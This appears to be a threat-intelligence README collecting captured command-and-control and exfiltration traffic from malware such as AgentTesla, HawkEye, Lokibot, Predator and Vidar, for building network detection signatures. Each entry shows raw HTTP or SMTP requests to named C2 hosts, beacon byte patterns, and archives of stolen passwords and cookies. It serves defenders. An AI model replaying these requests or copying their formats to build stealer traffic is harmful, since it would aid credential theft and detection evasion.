### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)

#### AgentTesla http:
~~~
POST /zin/WebPanel/api.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Content-Type: application/x-www-form-urlencoded
Host: megaplast.co.rs
Content-Length: 308
Expect: 100-continue
Connection: Keep-Alive

HTTP/1.1 100 Continue

p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")

#### AgentTesla smtp exil:
~~~
From: office@larbaxpo[.]com
To: officelogs@larbaxpo[.]com
Date: 9 Oct 2019 17:58:19 +0100
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7

----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/09/2019 17:58:13<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
5.183.107.236=0A<hr>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")

#### Bladabindi - nJrat
~~~
147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")

#### Hawkeye keyogger
~~~
From: mosharrof@mhcapparels.com
To: mosharrof@mhcapparels.com
Date: 9 Oct 2019 01:57:35 +0100
Subject: HawkEye Keylogger - Reborn v9 - Passwords Logs - admin \ USER-PC -
 89.187.165.47
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkNClBhc3N3b3JkcyBMb2dzDQphZG1p
biBcIFVTRVItUEMNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")

#### Imminent RAT
~~~
00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")

#### Lokibot

follw tcp stream, not http stream in wireshark
~~~
POST /sky/five/fre.php HTTP/1.0
User-Agent: Mozilla/4.08 (Charon; Inferno)
Host: fueda.info
Accept: */*
Content-Type: application/octet-stream
Content-Encoding: binary
Content-Key: 8DAA705A
Content-Length: 176
Connection: close

..'.......ckav.ru..
...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")

#### MilkyBoy
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
User-Agent: Adzq41ceq52e353512hSfj
Content-Length: 45
Host: qqwveqwevqwe.duckdns.org:10

key:Adz32151295uy129v5nqwrnvqwkjn5rv12n5vhSfj

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8593928
Server: Werkzeug/0.15.4 Python/2.7.6
Date: Wed, 09 Oct 2019 22:09:57 GMT

TVqQAAMAAAAEAAAA/

POST / HTTP/1.1
Host: qqwveqwevqwe.duckdns.org:10
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.11.1
key: Adz32516047vhSfj
filename: 58759853857.zip
Content-Length: 5334
Content-Type: multipart/form-data; boundary=80790cc2554f462cb375dcc301f5c66a

--80790cc2554f462cb375dcc301f5c66a
Content-Disposition: form-data; name="payload"; filename="payload"

PK........G.IO............
...PASSWORDS/PK........G.IO+&.6v...........e.txt=.I.. .....Wx./X....%......g[VN6A...z~......x}....xH......*b....<@.W.P..X......,|*.]$..
}..%.	.C{....7.W......Bas.....PK........I.IO................sys.txt].Ok.@....|..S...&jho.B..........R.[.OK(..].K.2.7.73o~...'..6D.>q....U..u.. .W..x.0....=.T.#...<0"....W.k.. .;..J1.q;X.{kz..S;_.f.t...D..Gh@......Q.v@G=}....m"...............Yy..!1U...i.xe...B.T%..	{5.....m...3.>....3.J..]Vh......&Y.@.8...T~1B!....l
kk.:......m$....B.._.E........PK........G.IO................PASSWORDS/CBase/PK........G.IO................PASSWORDS/FBase/PK........G.IO................PASSWORDS/CBase/Google/PK........G.IO).L
........#...PASSWORDS/CBase/Google/cookies.json....PK........G.IO".......[...)...PASSWORDS/CBase/Google/loginpasswords.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...x...Z.sy...2......(X).r.......
.d...V:....%...r.$.......d@|cS3...PK........G.IO."{.o...C..."...PASSWORDS/CBase/Google/webdata.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%......&..x...V.cy..2..K..sS.....2Ss@..\>.P........b.0.PK........G.IO................PASSWORDS/FBase/Mozilla/PK........G.IOp.0.$.......$...PASSWORDS/FBase/Mozilla/cookies.json..Mk.@.....!......$......Vl$..~.......-..j-...R/s.y..}.....8..q.zm.[..n.~U..e).z..7.7..............
...^z.6..t#....(@W.r43...U.iT.-.....%6.....1......}5......iG..Ut.i|".I....$...~...Q.yr_.....tA."..
@.p...',.!O!e..T.v.6..T.hEY*..H..Sq)....L......~...CD....E.0..Sa.T	..`b.J*i...G..."xpF.......PK........o.)M0..W............PASSWORDS/FBase
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")

#### Nanocore

flag on "38 00 00 00 17" pattern
~~~
00000000  38 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   8.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 f2 cf 3e 51 29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
00000030  03 99 38 f7 ac 3b f7 89 85 2e c4 d8               ..8..;.. ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")

flag on "40 00 00 00 17" pattern:
~~~
00000000  40 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   @.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 87 30 8f fa 78 9d 2a 01 c2 51 ee 07   .....0.. x.*..Q..
00000030  bd e7 23 95 3e ab a1 04 ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
00000040  13 e5 2b 52                                        ..+R
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")

#### Predator the Thief
~~~
POST /api/check.get HTTP/1.1
Content-Type: text/html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Host: 95.215.205.56
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73q

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73qPOST /api/gate.get?p1=2&p2=5&p3=0&p4=2&p5=0&p6=0&p7=0&p8=0&p9=0&p10=udh8T1P6VQh1ZF9DgIniQjWRSWBTqqYq5k2u HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------228
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Host: 95.215.205.56
Content-Length: 6028
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404

-----------------------------228
Content-Disposition: form-data; name="file"; filename="s7q3q0u1v7q3q0u1v7.zip"
Content-Type: application/octet-stream

PK..........IO................Outlook/UT
...K.].K.].K.]PK..........IOo...?...F.......Outlook/Outlook.txtUT
...K.].K.].K.]s.M...R...K.t(./.K..e..
H,.../J.......f@.`...+.CK#=C3.=C=C../..PK..........IO................General/UT
...K.].K.].K.]PK..........IO................Cookies/UT
...K.].K.].K.]PK..........IO................History/UT
...K.].K.].K.]PK..........IO................Other/UT
...K.].K.].K.]PK..........IOa.qZ............History/Chrome_0.txtUT
...K.].K.].K.].V[k.8.~..?.............B...>..,{D4.V....?..e..4M.M...`....s...O....3..b%....0.
7.'_.;s6.H}6.kZ.Fz........i...aZ...".".v.P.x>PR.[.D...$Q..."...%
f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z..&..t...P[...w...T....6A..!k...:...V...Fp.....-.a.....7......_.X...E../;..T8..7.I..)Y..(..,....)JP..........nf..g..E.\..(..@..XQ.l....".e..a.X .H.?*.".a.F9`..~zrzr..	.M......
.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")

#### Servhelper
~~~
POST /like/s.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Content-Length: 376
Host: laph.icu

key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1E%19%1D%0F%0AT%3C%0E%17%07OELG%22%09%1D%07%05%00%1ALYZ%5DCT.%1A%1D%00%0BT%5BYD%5DCTZ%5BY%0E%06%00L*%10%05%1B%1D%03%01%5D3%17BX0%01%1F%0A%06%02%0E%19%09UT9%3C1%3EB%24%2FK%2B%1B%06%1A%0D%0C%17V%18%13%0D%1A%00%05%03%15%0F%0CO%21%3AB%5B%05%1A%27%3AO3Z%40TY%40&resp=%03%04&rights=%0A%09%12%0A%09&misc=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")

#### Smokeloader
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://thankg1.org/
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Content-Length: 299
Host: thankg1.org

..ngl$j.N...$.=\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&....."5..V.~...#.,w......\N.V`.gI..0&.
.N.Z...%.b.....V..3H....t..6w.....7.0..
..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4	W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.
......qV4`..Pu*...8W.........M .h.v.S.:.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")

#### TA505 Loader:
~~~
POST /2021 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
Content-Length: 95
Host: windows-sys-update.com

&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
Server: nginx/1.10.3
Date: Wed, 09 Oct 2019 18:53:18 GMT
Content-Length: 0
Connection: keep-alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")

#### Ursnif:
~~~
POST /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2zC4RafXFoRlqL/4EC4YHwclzkXrfX/58a3.bmp HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data; boundary=36775038942641984568
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 399
Host: shoshanna.at

--36775038942641984568
Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"

\.\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..	..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9! 3.....7
--36775038942641984568--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursnif.png "Ursnif POST")

#### Vidar Stealer
~~~
POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 111609
Host: weimachel.net
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="hwid"

eeeb5d54-7880-42a7-b542-739bbc26cf4b
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="os"

Windows 7 Professional
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="platform"

x64
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="profile"

160
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="user"

admin
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="cccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="fcount"

1
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="telegram"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ver"

13.9
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="logs"; filename="CH_eeeb5d54-7880-42a7-b542-739bbc26cf4b3006040214.zip"
Content-Type: zip

PK........$.HO............#.../Autofill/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO................/CC/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HOF..`....u...5.../Cookies/cookies_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..O..0...X.G	......QdFg..G..XI..f....?.R[{.0Unm..U.._..\.f.nEY2S.3..m..?...e........B...'.r..>......P.4..HTQ..H..#.[M..k.R...b.o..d..<$g^..Y......6i.....2.x.....c..-.w..4.....<.....C.\.0q.B.s.m..$E.
...^.D...8..[vJ9c.:....,.J.i!......V....ii.........!.>cz....A..0..@.........Jl. 4.!.R.....".KA.r...w.IT.K).B|......<..P....8..k...y.....Z....Ji
U}...'F.....v.wnu.;.:..a.)...BC...m.Vw.k...I.<.._.]~..0
b..v.&Q@..LH.gSM...fAv&
<......].	...~...{.T....)^..9^......|.=..|.hZ...*7.<h.......Ko8..~.PK........&.HO................/Cookies/Edge_Cookies.txtUT
.....]...]...]..PK........$.HO.'.e........".../Cookies/Google Chrome_Default.txtUT
.....]...]...]..I..P.....Sp.;t...........+..a._?.$....t.R..*U.%I3...)....M. ..x2..S.....S.b...L......d.R...piwR......<~y....AWP..G......P..?.i.....b.'|jz.......&...C.^k.7....d........
..%..tF]..V.g...........T....
M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......p....{.d..l....!.."...........y.....{N.P....SY.3......V~......z.=....w.o.-j.......$..i&.s]..\...?....*55.f.
...r....#|..NW.EFR......L......fe.
.5..Q.s+...<.... .w..j.....PK........&.HOQ.......F......./Cookies/IE_Cookies.txtUT
.....]...]...].R.n.@.=7...[:]........ .x	`...8$......c..9...J....RRe...w.......,....	..0I.@.... .x...%.....<.].5.........PO\.F...EL..t.he.......x..h..V.c0G0.5%D...P...[m......]8.A."...Av)....J.B..|..D.Eq....8.....f&X......7....nn7.zW]..Y]d#.>O...(.~n....NM...	.".!..`Q&L08XX%....q...=......kVTy.|.lPf.....qm.....t;..~uow....k.@..9..'....i.`.........R.t.{.b......;.9..Pfb.......Tq...}%..s._N.*....	.{._PK........&.HO!...E...j......./cookie_list.txtUT
.....]...]...]U.1
.0..v...?..1.N...C_..C.IB.).O.(...~R..0.....L.x.(:SQ....=~\m.e...PK........$.HO............$.../Downloads/Google Chrome_Default.txtUT
.....]...]...]..PK........0.HO................/Files/Desktop.zipUT
.....]...]...]PK....................PK........4.HO................/Files/Users.zipUT
.....]...]...]PK....................PK........$.HO............".../History/Google Chrome_Default.txtUT
.....]...]...]..PK........$.HO.5..
.......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
.....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
